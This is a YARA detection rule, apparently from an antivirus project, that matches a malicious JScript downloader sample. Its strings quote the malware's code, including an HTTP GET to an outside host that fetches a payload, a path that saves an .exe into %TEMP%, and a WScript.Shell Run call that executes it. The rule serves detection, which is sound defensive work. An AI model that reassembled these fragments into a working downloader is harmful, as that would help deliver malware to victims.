rule sig_20160328_7fd7b15089a106800fed30cca2c852e7 {
  meta:
    description = "datamaliciousorder - file 20160328_7fd7b15089a106800fed30cca2c852e7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "26234ddcaf7a4b575428d7e7c1c8c1f675def47dd06d1092d27af357a2483f78"

  strings:
    $s1  = "function Ptzemjabuq() {return Kgmnwsiq[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"C8I2EcrYo4ReUgWh.exe\";};" fullword ascii
    $s2  = "function Xlwazu(Fkrwikod, Cocvcbd){return Fkrwikod - Cocvcbd;};" fullword ascii
    $s3  = "var Kgmnwsiq = function Goldwvox() {return WScript[Pkgys](\"WScript.Shell\");}();" fullword ascii
    $s4  = "do {WScript[Nxmuey](Rwzqdzeh() * 11)} while (Svglyca[\"readystate\"] < 4 );" fullword ascii
    $s5  = "Svglyca[Lqkqlkydo](\"GET\", \"http://www.stopeugenicsnow.eu/m8dhs\", false);" fullword ascii
    $s6  = "function Mmroh(Mevhizju){Kgmnwsiq[\"Run\"](Mevhizju, Nlfhqui, Nlfhqui);};" fullword ascii
    $s7  = "function Dgsmxobfu() {return ((Fuvaxagjhz == true) && (Fuvaxagjhz == Rboovei)) ? 1 : Nlfhqui;};" fullword ascii
    $s8  = "function Bjshswj()" fullword ascii
    $s9  = " while (Fcmxjdfun){" fullword ascii
    $s10 = "Rboovei = true; " fullword ascii
    $s11 = "function Dqfsfrslb(){return Gyjjp;};" fullword ascii
    $s12 = "Fuvaxagjhz = true; " fullword ascii
    $s13 = "var Rboovei = false;" fullword ascii
    $s14 = "var Hgrbf = new this[\"Date\"]();" fullword ascii
    $s15 = "function Bamcryebgu(){return Pkgys;};" fullword ascii
    $s16 = "function Rwzqdzeh(){return 22;};" fullword ascii
    $s17 = "var Fuvaxagjhz = false;" fullword ascii
    $s18 = "var Kgrhy = false;" fullword ascii
    $s19 = "return Xlwazu(Frncg, Zfvxbo);" fullword ascii
    $s20 = "function Gbjftabia(Fupfxdmlfm) {var Ueypqamrb = (1, 2, 3, 4, 5, Fupfxdmlfm); return Ueypqamrb;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}